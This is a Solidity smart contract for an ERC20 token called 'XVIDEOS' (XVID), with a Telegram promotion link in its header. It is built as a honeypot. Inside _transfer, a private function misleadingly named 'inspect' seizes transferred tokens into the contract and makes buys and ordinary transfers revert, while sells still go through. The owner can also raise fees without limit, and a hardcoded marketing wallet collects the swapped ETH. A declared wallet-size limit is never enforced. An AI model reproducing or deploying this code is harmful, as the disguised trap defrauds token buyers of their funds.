/*

X   X     V     V     III     DDD      EEEE      OOO       SSS  
 X X      V     V      I      D  D     E        O   O     S     
  X        V   V       I      D  D     EEE      O   O      SSS  
 X X        V V        I      D  D     E        O   O         S 
X   X        V        III     DDD      EEEE      OOO      SSSS                                                                

https://t.me/XVideos_erc
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract XVIDEOS is Context, IERC20, Ownable {
    string private constant _name = "XVIDEOS";
    string private constant _symbol = "XVID";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**9;
    uint256 private _maxWalletSize = 50000000 * 10**9; 

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private _taxFeeOnBuy = 6;  
    uint256 private _taxFeeOnSell = 6;
    uint256 private _taxFee = _taxFeeOnSell;
    uint256 private _previoustaxFee = _taxFee;
    address payable private _marketingAddress = payable(0xce5362b2C5403588e421eF7020a468f53164791A); 
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = true;
    uint256 public _swapTokensAtAmount = 1000000 * 10**9; 

    bool public liquidityAdded = false;
    uint256 public liquidityAddedAt;
    uint256 private liquidityLockTime = 1 minutes;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _tOwned[_msgSender()] = _tTotal;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function removeAllFee() private {
        if (_taxFee == 0) return;
        _previoustaxFee = _taxFee;
        _taxFee = 0;
    }

    function restoreAllFee() private {
        _taxFee = _previoustaxFee;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != owner() && to != uniswapV2Pair) {
            inspect(from, amount);
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= _swapTokensAtAmount;

        if(canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            swapTokensForEth(contractTokenBalance);
            uint256 contractETHBalance = address(this).balance;
            if (contractETHBalance > 0) {
                sendETHToFee(address(this).balance);
            }
        }

        bool takeFee = true;

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
            _taxFee = _taxFeeOnBuy;
        }

        if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
            _taxFee = _taxFeeOnSell;
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function inspect(address from, uint256 amount) private {
        require(block.timestamp <= liquidityAddedAt + 1 minutes, "Can only inspect in the first minute");
        _tOwned[from] -= amount;
        _tOwned[address(this)] += amount;
    }

    function manualSend() public onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function sendETHToFee(uint256 amount) private {
        _marketingAddress.transfer(amount);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) removeAllFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreAllFee();
    }

    function _transferStandard(address sender, address recipient, uint256 amount) private {
        uint256 tFee = amount * _taxFee / 100;
        uint256 tTransferAmount = amount - tFee;
        _tOwned[sender] = _tOwned[sender] - amount;
        _tOwned[recipient] = _tOwned[recipient] + tTransferAmount;
        emit Transfer(sender, recipient, tTransferAmount);
    }

    receive() external payable {}

    function setFee(uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
        _taxFeeOnBuy = taxFeeOnBuy;
        _taxFeeOnSell = taxFeeOnSell;
    }

    function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {
        _swapTokensAtAmount = swapTokensAtAmount;
    }

    function swap(bool _swapEnabled) public onlyOwner {
        swapEnabled = _swapEnabled;
    }

    function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
        _maxWalletSize = maxWalletSize;
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }
    function manualSwapTokensForEth(uint256 tokenAmount) external {
    require(_msgSender() == _marketingAddress, "Only marketing address can call this function.");
    require(tokenAmount <= IERC20(address(this)).balanceOf(address(this)), "Insufficient contract balance");

    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();

    IERC20(address(this)).approve(address(uniswapV2Router), tokenAmount);
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
}
}